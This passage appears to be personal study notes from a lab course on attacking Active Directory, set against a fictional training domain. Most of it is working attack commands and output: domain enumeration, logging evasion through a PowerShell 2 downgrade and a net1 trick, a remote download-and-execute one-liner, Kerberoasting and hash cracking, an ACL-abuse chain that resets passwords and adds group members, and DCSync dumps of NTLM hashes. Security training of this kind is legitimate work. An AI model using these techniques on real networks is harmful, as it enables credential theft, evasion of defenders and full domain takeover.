    `-c` = checks; all checks in this case.

we will get various json file

* `zip -r ilfreight_bh.zip *.json` → zip up the json file.

## **Credentialed Enumeration - from Windows**

1️⃣ \*\*ActiveDirectory PowerShell Module\*\*

* `Get-Module` → list all available modules
* `Import-Module ActiveDirectory` → import ActiveDirectory module if not imported.
* `Get-ADDomain` → Get basic info about the domain.
* `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`→ lists account that are susceptible to a Kerberoasting attack.
* `Get-ADTrust -Filter *` → checking for trust relationships
* `Get-ADGroup -Filter * | select name` → Group Enumeration
* `Get-ADGroup -Identity "Backup Operators"` → Detailed Group Enumeration
* `Get-ADGroupMember -Identity "Backup Operators"` → List Group Membership

2️⃣ \*\*PowerView\*\*

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment

| Command                         | Description                                                                                |
| ------------------------------- | ------------------------------------------------------------------------------------------ |
| Export-PowerViewCSV             | Append results to a CSV file                                                               |
| ConvertTo-SID                   | Convert a User or group name to its SID value                                              |
| Get-DomainSPNTicket             | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| Domain/LDAP Functions:          |                                                                                            |
| Get-Domain                      | Will return the AD object for the current (or specified) domain                            |
| Get-DomainController            | Return a list of the Domain Controllers for the specified domain                           |
| Get-DomainUser                  | Will return all users or specific user objects in AD                                       |
| Get-DomainComputer              | Will return all computers or specific computer objects in AD                               |
| Get-DomainGroup                 | Will return all groups or specific group objects in AD                                     |
| Get-DomainOU                    | Search for all or specific OU objects in AD                                                |
| Find-InterestingDomainAcl       | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| Get-DomainGroupMember           | Will return the members of a specific domain group                                         |
| Get-DomainFileServer            | Returns a list of servers likely functioning as file servers                               |
| Get-DomainDFSShare              | Returns a list of all distributed file systems for the current (or specified) domain       |
| GPO Functions:                  |                                                                                            |
| Get-DomainGPO                   | Will return all GPOs or specific GPO objects in AD                                         |
| Get-DomainPolicy                | Returns the default domain policy or the domain controller policy for the current domain   |
| Computer Enumeration Functions: |                                                                                            |
| Get-NetLocalGroup               | Enumerates local groups on the local or a remote machine                                   |
| Get-NetLocalGroupMember         | Enumerates members of a specific local group                                               |
| Get-NetShare                    | Returns open shares on the local (or a remote) machine                                     |
| Get-NetSession                  | Will return session information for the local (or a remote) machine                        |
| Test-AdminAccess                | Tests if the current user has administrative access to the local (or a remote) machine     |
| Threaded 'Meta'-Functions:      |                                                                                            |
| Find-DomainUserLocation         | Finds machines where specific users are logged in                                          |
| Find-DomainShare                | Finds reachable shares on domain machines                                                  |
| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain             |
| Find-LocalAdminAccess           | Find machines on the local domain where the current user has local administrator access    |
| Domain Trust Functions:         |                                                                                            |
| Get-DomainTrust                 | Returns domain trusts for the current domain or a specified domain                         |
| Get-ForestTrust                 | Returns all forest trusts for the current forest or a specified forest                     |
| Get-DomainForeignUser           | Enumerates users who are in groups outside of the user's domain                            |
| Get-DomainForeignGroupMember    | Enumerates groups with users outside of the group's domain and returns each foreign member |
| Get-DomainTrustMapping          | Will enumerate all trusts for the current domain and any others seen.                      |

3️⃣ \*\*SharpView\*\*

Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView

* `PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend` → get info about specific user

4️⃣ \*\*Snaffler\*\*

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment

* `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`

5️⃣ \*\*BloodHound ⭐\*\*

* `PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT` → running sharphound collector from MS01 attack host

Then transfer the data to our attacking host and open in bloodhound.

## **Living Off the Land**

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

#### **Basic Enumeration Commands**

| Command                                               | Result                                                                                     |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| hostname                                              | Prints the PC's Name                                                                       |
| \[System.Environment]::OSVersion.Version              | Prints out the OS version and revision level                                               |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host                                        |
| ipconfig /all                                         | Prints out network adapter state and configurations                                        |
| set                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| echo %USERDOMAIN%                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| echo %logonserver%                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

* `systeminfo` → will print a summary of the hosts information for us in one tidy output

| Cmd-Let                                                                                                          | Description                                                                                                                                                                                                                                 |
| ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Get-Module                                                                                                       | Lists available modules loaded for use.                                                                                                                                                                                                     |
| Get-ExecutionPolicy -List                                                                                        | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2 settings for each scope on a host.                                                         |
| Set-ExecutionPolicy Bypass -Scope Process                                                                        | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost\_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                     |
| Get-ChildItem Env:                                                                                               | ft Key,Value                                                                                                                                                                                                                                |
| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); "             | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                      |

#### **Downgrade Powershell**

If not uninstalled, there can be older version of powershell. Powershell event logging was introduces as a feature with powershell 3.0 and forward.

If we can call Powershell version 2.0 or older, our action will not be logged into Event Viewer.

* `Get-host` → displays the version of current powershell
* `powershell.exe -version 2` → running version 2 of powershell.

1️⃣ \*\*Checking Defenses\*\*

* `PS C:\htb> netsh advfirewall show allprofiles` → Firewall checks
* `C:\htb> sc query windefend` → windows defender from cmd
* `PS C:\htb> Get-MpComputerStatus` → check the status and configuration settings

2️⃣ \*\*Am I Alone?\*\*

* `PS C:\htb> qwinsta` → display info about remote desktop services.

| Networking Commands          | Description                                                                                                      |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| arp -a                       | Lists all known hosts stored in the arp table.                                                                   |
| ipconfig /all                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| route print                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| netsh advfirewall show state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

3️⃣ \*\*Windows Management Instrumentation (WMI)\*\*

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

#### **Quick WMI checks**

| Command                                                                            | Description                                                                                            |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| wmic qfe get Caption,Description,HotFixID,InstalledOn                              | Prints the patch level and description of the Hotfixes applied                                         |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list                              |
| wmic process list /format:list                                                     | A listing of all processes on host                                                                     |
| wmic ntdomain list /format:list                                                    | Displays information about the Domain and Domain Controllers                                           |
| wmic useraccount list /format:list                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| wmic group list /format:list                                                       | Information about all local groups                                                                     |
| wmic sysaccount list /format:list                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

4️⃣ \*\*Net Commands\*\*

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

* Local and domain users
* Groups
* Hosts
* Specific users in groups
* Domain Controllers
* Password requirements

#### **Table of Useful Net Commands**

| Command                                        | Description                                                                                                                |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| net accounts                                   | Information about password requirements                                                                                    |
| net accounts /domain                           | Password and lockout policy                                                                                                |
| net group /domain                              | Information about domain groups                                                                                            |
| net group "Domain Admins" /domain              | List users with domain admin privileges                                                                                    |
| net group "domain computers" /domain           | List of PCs connected to the domain                                                                                        |
| net group "Domain Controllers" /domain         | List PC accounts of domains controllers                                                                                    |
| net group \<domain\_group\_name> /domain       | User that belongs to the group                                                                                             |
| net groups /domain                             | List of domain groups                                                                                                      |
| net localgroup                                 | All available groups                                                                                                       |
| net localgroup administrators /domain          | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| net localgroup Administrators                  | Information about a group (admins)                                                                                         |
| net localgroup administrators \[username] /add | Add user to administrators                                                                                                 |
| net share                                      | Check current shares                                                                                                       |
| net user \<ACCOUNT\_NAME> /domain              | Get information about a user within the domain                                                                             |
| net user /domain                               | List all users of the domain                                                                                               |
| net user %username%                            | Information about the current user                                                                                         |
| net use x: \computer\share                     | Mount the share locally                                                                                                    |
| net view                                       | Get a list of computers                                                                                                    |
| net view /all /domain\[:domainname]            | Shares on the domains                                                                                                      |
| net view \computer /ALL                        | List shares of a computer                                                                                                  |
| net view /domain                               | List of PCs of the domain                                                                                                  |

#### **Net Commands Trick**

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

5️⃣ \*\*Dsquery\*\*

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section.

We need to have elevated privileges on host or ability to run an instance of Cmd prompt or PowerShell from a SYSTEM context.

* `dsquery user` → list users
* `dsquery computer` → computer search
* `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` → wildcard search to view all objects in an OU
* `PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` → search for all domain controllers in current domain limiting to five result. strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. are LDAP queries that can be used with several different tools too, including AD powershell, ldapsearch etc

`userAccountControl:1.2.840.113556.1.4.803:` → specifies that we are lookin at the UAC attributes for an object

```
`=8192` ⇒ represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like 

           `password is   not required` or `account is locked` is set.

 

### **UAC Values**

![Untitled](ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%202.png)

QUESTION

Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.

- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(memberOf=CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)))" -attr sAMAccountName -limit 0`
    
    
    Gives the list of users having administrative privileges and disabled account
    
- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(sAMAccountName=username))" -attr description`
    
    
    This will show the content of description of the given user.
    
```

## Cooking With Fire (kerberoasting)

## Kerberoasting - From Linux

This attack targets `Service Principal Names (SPN)` accounts.

SPN are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.

Any domain user can request a Kerberos ticket for any service account in the same domain.

**Depending on your position in a network, this attack can be performed in multiple ways:**

* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.
* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend` → list spn accounts
* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request` → Requesting all TGS tickets
* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev` → Requesting a single TGS ticket.

we can use `-outputfil filename` flag to save the TGS ticket in a file.

* `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt` → cracking Ticket offline using Hashcat
* `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` → testing authentication against a domain controller

## Kerberoasting - From Windows

👽 Semi Manual Method

* `C:\htb> setspn.exe -Q */*` → lists various available SPNs
* `PS C:\htb> Add-Type -AssemblyName System.IdentityModel`
* `PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
  * The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
  * The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
  * [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
  * We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
  * We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We are requesting TGS tickets for an account mssqlsvc and load them into memory to later extract using Mimikatz

* `PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` → request tickets for all accounts with SPNs set.

Now lets extract tickets from mimikatz

```
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE
<...................SNIP...................>
LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================

   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi

<SNIP>
```

if we do not specify  `base64 /out:true` , mimikatz will extract the tickets and write them to `.kirbi` files

* decode this base64 Blob and save into file`sqldev.kirbi`
* then use `kirbi2john` to extract Kerberos Ticket.
*   `dollarboysushil@htb[/htb]**$** sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` → modify the file/hash for Hashcat

    \*\*$\*\*krb5tgs$23$_sqldev.kirbi_$813149fb261549a6a1b38e71a057feeab → it will look something like this
* `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` → finally cracking the hash.

🤖 \*\*Automated / Tool Based Route\*\*

* `setspn.exe -Q */*` → list available spns

## **Using PowerView**

* `PS C:\htb> Import-Module .\PowerView.ps1` → importing powerview
* `PS C:\htb> Get-DomainUser * -spn | select samaccountname` → getting spn account
* `PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` → Targeting Specific User
* `PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` → Exporting All tickets to csv file

## **Using Rubeus**

Rubeus doesnot need us to explicitly set the SPN or the user.

* `PS C:\htb> .\Rubeus.exe kerberoast /stats` → get the stats
*   `PS C:\htb> .\Rubeus.exe kerberoast`

    we can add flag `/nowrap` so that hash will not be wrapped in any form so it will be easier to crack using hashcat.

    also we can use `/outfile:filename` to save the ticket, instead of displaying it.
* `PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap` → for specific user.

we can use `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.

RC4 is easier to crack compared to AES 256 and128

## An ACE in the Hole

Access Control List (ACL) Abuse Primer

ACL are list that defines

* Who has access to which asset/resources
* the level of access they are provisioned.

The settings themselves in an ACL are called `Access Control Entries` (`ACEs`)

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 3.png>)

## **ACL Enumeration**

## **Using PowerView**

* `PS C:\htb> Import-Module .\PowerView.ps1`
* `PS C:\htb> $sid = Convert-NameToSid wley` → Getting SID of the target user.
* `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`

```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

This shows, user wley has User-Force-Change-Password over user damundsen

Further enumerating rights of damundsen

* `PS C:\htb> $sid2 = Convert-NameToSid damundsen`
* `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose`

```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsenPS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -VerboseAceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

This shows user damundsen has GenericWrite privileges over the Help Desk Level 1 Group.

## **Enumerating ACLs with BloodHound**

Import the file from ingestor

in search box, search for the user we have control `wley` in this case.

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 4.png>)

In Node info tab, we can use the `Outbound Object Control section`

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 5.png>)

we can see `wley` has `force change password` over the user `damundsen` user

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 6.png>)

we can then right click on the line, which gives us help option

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 7.png>)

which shows help around abusing this ACE

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 8.png>)

we can get whole attack path from `Transitive Object Control` Section

## **ACL Abuse Tactics**

From previous Section, we will continue to do attack

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 9.png>)

* First we will use user `wley` to change password of `damundsen`
* then using `damundsen` we will use `Generic Write` right to add user we control to `Help Desk Level 1` group
* User of `Help Desk Level 1` group is member of `Info Tech` group and member of `Info Tech` group have generic all right over user `adunn`
* Thus we will take control of user `Adunn`
* `PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` → creating $secpassword variable which stores passoword of wley
* `PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` → creating $cred variable which stores PSCredential object which contains securely stored user credentials. Because later -Credential parameter expects a PSCredential object not a plain text string.
* `PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` → creating variable to store password for damundsen user

import powerview and then

* `PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` → changing password of user damundsen
* `PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)` → creating PSCredential object which contains creds of user damundsen

Before adding user damundsen to `Help Desk Level 1` Group, lets confirm our user is not a member of the target group

* `PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`

Now lets add to `Help Desk Level 1` group

* `PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
* `PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName` → confirming damundsen was added to the group

If for some reason we donot have permission to interrupt the admin account `adunn`

we can create a fake SPN, then kerberoast to obtain TGS ticket and hopefully crack the hash offline .

* `PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` → creating a fake SPN
* `PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap`

Kerberoasting with Rubeus

| Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose                | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host.                       |
| ------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose | PowerView tool used to remove a specific user (damundsent) from a specific security group (Help Desk Level 1) from a Windows-based host. |
| ConvertFrom-SddlString                                                                                  | PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.                            |

## **DCSync**

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

First lets check if the user have Replication Rights

* `Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl` → View adunn’s group Membership. Copy the objectsid of the user.
* `PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"` → set variable `sid`
* `PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl` → finally check the users Replication Rights

```powershell
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

```

## **Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**

```
[!bash!]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK# 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
```

Here we are using `-just-dc` flag to to extract NTLM hash and Kerberos Keys from NTDS file.

we can use `-just-dc-ntlm` if we ant only NTLM hash

also we can use, `-just-dc-user <USERNAME>` to extract data for a specific user.

and flag `-user-status` to check if user is disabled.

`-history` to dump password history.

Using `-just-dc` flag creates three file

→ one with NTLM hash → one with Kerberos Keys → one containing cleartext password from the NTDS for any accounts set with reversible encryption

When reversible encryption is enabled in an account, password are not stored in cleartext.Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.

* `PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl` → lists user with reversible encryption set

## **Performing the Attack with Mimikatz**

Using mimikatz we must target a specific user.

also mimikatz should run in the context of the user who has DCSync Privileges, which can be achieved using `runas.exe`

* `C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell`→ running as user adunn

Now in the new powershell, fireup mimikatz

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
